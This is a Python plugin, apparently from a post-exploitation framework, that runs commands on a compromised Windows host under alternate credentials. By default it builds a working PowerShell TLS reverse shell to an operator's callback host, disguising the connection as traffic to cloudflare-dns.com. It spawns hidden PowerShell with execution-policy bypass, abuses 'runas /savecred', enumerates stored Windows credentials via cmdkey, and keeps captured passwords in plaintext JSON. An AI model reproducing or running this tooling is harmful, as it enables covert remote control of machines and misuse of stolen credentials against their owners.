import argparse
import base64
import json
import os
import sys
import traceback
from typing import Any, Dict, List, Optional

from ...constants import PLUGIN_MARK_END, PLUGIN_MARK_START
from ..api import plugin, SessionContext
from ..shared.common import format_generic_report
from ..shared.runner import run_collector_plugin

if sys.platform == 'win32':
    import winreg
else:
    winreg = None

_PLUGIN_FILE = os.path.abspath(__file__)
TOOL_ROOT = os.path.dirname(os.path.dirname(os.path.dirname(os.path.dirname(_PLUGIN_FILE))))
LOGS_DIR = os.path.join(TOOL_ROOT, "logs")
CREDENTIALS_FILE = os.path.join(LOGS_DIR, "runas_creds.json")


RUNAS_USAGE = """
runas — Run a command on the LOCAL target host under alternate credentials.

Usage:
  runas -u <user> (-p <pass> | -sv | -wsv) [-C <cmd>] [-rh <ip> -rp <port>] [-d <domain>]
  runas -eu

Options:
  -u,  --username <user>       Alternate user (required unless -eu).
  -p,  --password <pass>       Saved immediately to operator JSON (overwrites).
  -sv, --saved-cred            Reuse password from logs/runas_creds.json.
  -wsv,--windows-saved-cred    Use Windows Credential Manager on the TARGET.
  -eu, --enum-cred             Enumerate credentials and exit.
  -C,  --custom <command>      PowerShell command to run (default: reverse shell).
  -rh, --callback-host <ip>    Listener IP for the default reverse shell.
  -rp, --callback-port <port>  Listener port for the default reverse shell.
  -d,  --domain <domain>       Domain to prepend to the username.
""".strip()

PLUGIN_INFO = RUNAS_USAGE

class _UsageRequested(Exception):
    pass


class _ArgumentError(Exception):
    pass


class _ArgParser(argparse.ArgumentParser):
    def error(self, message):
        raise _ArgumentError(message)

    def exit(self, status=0, message=None):
        if status == 0:
            raise _UsageRequested()
        raise _ArgumentError(message or "argument error")

def _ensure_logs_dir():
    try:
        os.makedirs(LOGS_DIR, exist_ok=True)
    except Exception:
        pass


def _load_creds() -> Dict[str, str]:
    _ensure_logs_dir()
    if os.path.exists(CREDENTIALS_FILE):
        try:
            with open(CREDENTIALS_FILE, 'r', encoding='utf-8') as f:
                return json.load(f)
        except Exception:
            return {}
    return {}


def _save_credential(username: str, password: str) -> bool:
    try:
        _ensure_logs_dir()
        creds = _load_creds()
        creds[username] = password
        with open(CREDENTIALS_FILE, 'w', encoding='utf-8') as f:
            json.dump(creds, f, indent=2)
        return True
    except Exception:
        return False


def _lookup_credential(username: str) -> Optional[str]:
    c = _load_creds()
    if username in c:
        return c[username]
    if "\\" in username:
        bare = username.split("\\", 1)[1]
        if bare in c:
            return c[bare]
    for k, v in c.items():
        if "\\" in k and k.split("\\", 1)[1] == username:
            return v
    return None


def _list_credentials() -> List[str]:
    return list(_load_creds().keys())


def is_domain_joined() -> bool:
    if winreg is None:
        return False
    try:
        k = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE,
                           r"SYSTEM\CurrentControlSet\Services\Tcpip\Parameters")
        d, _ = winreg.QueryValueEx(k, "Domain")
        winreg.CloseKey(k)
        return bool(d and d.strip())
    except Exception:
        return False

def _ps_quote(s: str) -> str:
    return (s or "").replace("'", "''")


def _reverse_shell_ps(host: str, port: int) -> str:
    return (
        f"$a=New-Object Net.Sockets.TcpClient('{host}',{port});"
        f"$b=New-Object Net.Security.SslStream($a.GetStream(),$false,({{$true}}));"
        f"$b.AuthenticateAsClient('cloudflare-dns.com');"
        f"$r=New-Object IO.StreamReader($b);"
        f"$w=New-Object IO.StreamWriter($b);"
        f"$w.AutoFlush=$true;"
        f"$w.WriteLine('SHELL> ');"
        f"while(($l=$r.ReadLine()) -ne $null){{"
        f"$o=try{{Invoke-Expression $l 2>&1|Out-String}}catch{{$_|Out-String}};"
        f"$w.WriteLine($o)}}"
    )

def _build_password_spawn_script(user_for_spawn: str,
                                 password: str,
                                 inner_ps: str) -> str:
    user_q = _ps_quote(user_for_spawn)
    pw_q = _ps_quote(password or "")
    inner_b64 = base64.b64encode(inner_ps.encode('utf-8')).decode('ascii')

    template = (
        "$s='%(S)s';$e='%(E)s';$k=0;$r=''\n"
        "try{\n"
        "$p=\"$env:Public\\r.ps1\"\n"
        "[IO.File]::WriteAllText($p,"
        "[Text.Encoding]::UTF8.GetString("
        "[Convert]::FromBase64String('%(I)s')),[Text.Encoding]::UTF8)\n"
        "$sec=ConvertTo-SecureString '%(P)s' -AsPlainText -Force\n"
        "$cred=New-Object Management.Automation.PSCredential('%(U)s',$sec)\n"
        "Start-Process powershell -Credential $cred -WindowStyle Hidden "
        "-ArgumentList '-NoP','-NonI','-W','Hidden','-Exec','Bypass',"
        "'-File',$p\n"
        "$k=1;Start-Sleep 10;Remove-Item $p -Force -EA 0\n"
        "}catch{$r=$_.Exception.Message}\n"
        "$o=[ordered]@{ok=$k;err=$r}\n"
        "Write-Output ($s+(ConvertTo-Json $o -Compress)+$e)\n"
    ) % {
        "S": PLUGIN_MARK_START,
        "E": PLUGIN_MARK_END,
        "U": user_q,
        "P": pw_q,
        "I": inner_b64,
    }
    return template


def _build_savecred_script(user: str, inner_ps: str) -> str:
    user_q = _ps_quote(user)
    inner_b64 = base64.b64encode(inner_ps.encode('utf-16le')).decode('ascii')
    template = (
        "$s='%(S)s';$e='%(E)s';$k=0;$r=''\n"
        "try{\n"
        "$l='runas /savecred /user:%(U)s \"powershell "
        "-NoP -NonI -W Hidden -Exec Bypass -EncodedCommand %(I)s\"'\n"
        "Start-Process -WindowStyle Hidden cmd.exe -ArgumentList '/c',$l\n"
        "$k=1\n"
        "}catch{$r=$_.Exception.Message}\n"
        "$o=[ordered]@{ok=$k;err=$r}\n"
        "Write-Output ($s+(ConvertTo-Json $o -Compress)+$e)\n"
    ) % {
        "S": PLUGIN_MARK_START,
        "E": PLUGIN_MARK_END,
        "U": user_q,
        "I": inner_b64,
    }
    return template

def build_enum_script() -> str:
    return (
        "$ErrorActionPreference='SilentlyContinue'\n"
        "$start='" + PLUGIN_MARK_START + "'; $end='" + PLUGIN_MARK_END + "'\n"
        "$entries = @()\n"
        "$current = $null\n"
        "foreach ($l in (cmdkey /list 2>&1)) {\n"
        "  $s = [string]$l\n"
        "  if ($s -match '^\\s*Target:\\s*(.+?)\\s*$') {\n"
        "    if ($null -ne $current) { $entries += $current }\n"
        "    $current = [ordered]@{ target=$matches[1]; user=''; "
        "type=''; savecred_usable=$false }\n"
        "  } elseif ($null -ne $current -and $s -match '^\\s*User:\\s*(.+?)\\s*$') {\n"
        "    $current.user = $matches[1]\n"
        "  } elseif ($null -ne $current -and $s -match '^\\s*Type:\\s*(.+?)\\s*$') {\n"
        "    $current.type = $matches[1]\n"
        "    if ($current.target -like 'Domain:interactive=*') "
        "{ $current.savecred_usable = $true }\n"
        "  }\n"
        "}\n"
        "if ($null -ne $current) { $entries += $current }\n"
        "$r = [ordered]@{ count=$entries.Count; credentials=$entries }\n"
        "Write-Output ($start + (ConvertTo-Json $r -Depth 4 -Compress) + $end)\n"
    )

def parse_runas_args(args: List[str]) -> Dict[str, Any]:
    parser = _ArgParser(add_help=False)
    parser.add_argument('-u', '--username')
    parser.add_argument('-p', '--password')
    parser.add_argument('-C', '--custom')
    parser.add_argument('-sv', '--saved-cred', action='store_true')
    parser.add_argument('-wsv', '--windows-saved-cred', action='store_true')
    parser.add_argument('-eu', '--enum-cred', action='store_true')
    parser.add_argument('-rh', '--callback-host')
    parser.add_argument('-rp', '--callback-port', type=int)
    parser.add_argument('-d', '--domain')
    parser.add_argument('--help', action='store_true')

    try:
        parsed, _ = parser.parse_known_args(args)
    except _ArgumentError as e:
        raise ValueError(str(e))

    if parsed.help or len(args) == 0 or (args[0] in ('-h', '--help') and len(args) == 1):
        raise _UsageRequested()

    if parsed.enum_cred:
        return {'enum_cred': True}

    if not parsed.username:
        raise ValueError("Username (-u) is required unless -eu is used.")

    full_username = parsed.username
    if parsed.domain:
        full_username = f"{parsed.domain}\\{parsed.username}"

    methods = sum([bool(parsed.password),
                   bool(parsed.saved_cred),
                   bool(parsed.windows_saved_cred)])
    if methods == 0:
        raise ValueError("One of -p, -sv, or -wsv is required.")
    if methods > 1:
        raise ValueError("Only one of -p, -sv, or -wsv may be used.")

    if parsed.saved_cred:
        pw = _lookup_credential(full_username)
        if pw is None:
            raise ValueError(
                f"No saved credential for '{full_username}' in "
                f"{CREDENTIALS_FILE}. Run once with -p to populate it."
            )
        parsed.password = pw
        parsed.windows_saved_cred = False
    elif parsed.windows_saved_cred:
        parsed.password = None

    if parsed.custom is None:
        if parsed.callback_host is None or parsed.callback_port is None:
            raise ValueError("When -C is not provided, both -rh and -rp are required.")

    parsed.full_username = full_username
    return vars(parsed)

def _print_plugin_store(session):
    creds = _list_credentials()
    session.print("", 'white')
    session.print(f"Plugin credential store  ({CREDENTIALS_FILE})", 'cyan')
    if not creds:
        session.print("  (empty — populate with -p on any run)", 'yellow')
    else:
        for u in creds:
            session.print(f"  [sv] {u}", 'white')
        session.print("  [sv] = reusable with `runas -u <user> -sv`", 'yellow')

def _run_plugin_inner(session: SessionContext, args: List[str]):
    if not args or any(a in ('-h', '--help') for a in args):
        session.print(RUNAS_USAGE)
        return 0

    session.log_event('runas: execution started')

    try:
        params = parse_runas_args(args)
    except _UsageRequested:
        session.print(RUNAS_USAGE)
        return 0
    except ValueError as e:
        session.print(f"Argument error: {e}", 'red')
        session.log_plugin_result('runas', '', 'argument_error')
        return 1

    if params.get('enum_cred'):
        def build_enum():
            return build_enum_script()

        rc = run_collector_plugin(
            session, 'runas', None, build_enum, format_generic_report,
            timeout=20.0,
        )
        _print_plugin_store(session)
        session.log_plugin_result('runas', 'Enumerated credentials', 'success')
        return rc

    username = params['full_username']
    password = params.get('password')
    custom = params.get('custom')
    callback_host = params.get('callback_host')
    callback_port = params.get('callback_port')
    use_wsv = bool(params.get('windows_saved_cred'))
    domain = params.get('domain')

    if domain and not is_domain_joined():
        session.print(
            "Error: This machine is not joined to a domain. "
            "Domain credentials cannot be used.", 'red')
        session.log_plugin_result('runas', 'Domain credentials on non-domain machine',
                                  'failure')
        return 1

    if password and not use_wsv and not params.get('saved_cred'):
        if _save_credential(username, password):
            session.print(
                f"Credential saved for {username} at {CREDENTIALS_FILE}.", 'green')
        else:
            session.print(
                f"Warning: could not write {CREDENTIALS_FILE}.", 'yellow')

    if custom:
        inner_ps = custom
        session.print(f"Executing on target as {username}: {custom}", 'yellow')
    else:
        inner_ps = _reverse_shell_ps(callback_host, callback_port)
        session.print(
            f"Generating reverse shell payload "
            f"(TLS to {callback_host}:{callback_port})...", 'yellow')

    if use_wsv:
        script = _build_savecred_script(username, inner_ps)
    else:
        script = _build_password_spawn_script(username, password or "", inner_ps)

    session.print(f"Script size: {len(script)} chars.", 'yellow')

    def build_script():
        return script

    rc = run_collector_plugin(
        session, 'runas', None, build_script, format_generic_report,
        timeout=30.0,
    )

    if rc == 0:
        session.log_plugin_result('runas', f"Executed on target as {username}",
                                  'success')
    else:
        session.log_plugin_result('runas', f"Failed on target as {username}",
                                  'failure')
    return rc

def run_plugin(session: SessionContext, args: List[str]):
    try:
        return _run_plugin_inner(session, args)
    except SystemExit:
        session.print("Plugin attempted to exit the process — suppressed.", 'red')
        return 1
    except BaseException:
        session.print("Plugin crashed:\n" + traceback.format_exc(), 'red')
        try:
            session.log_plugin_result('runas', 'plugin crashed', 'failure')
        except Exception:
            pass
        return 1


@plugin.command(
    name='runas',
    platforms=['windows'],
    description="Run a local command under alternate credentials "
                "(Windows runas equivalent).",
)
def runas(session: SessionContext, args: List[str]):
    return run_plugin(session, args)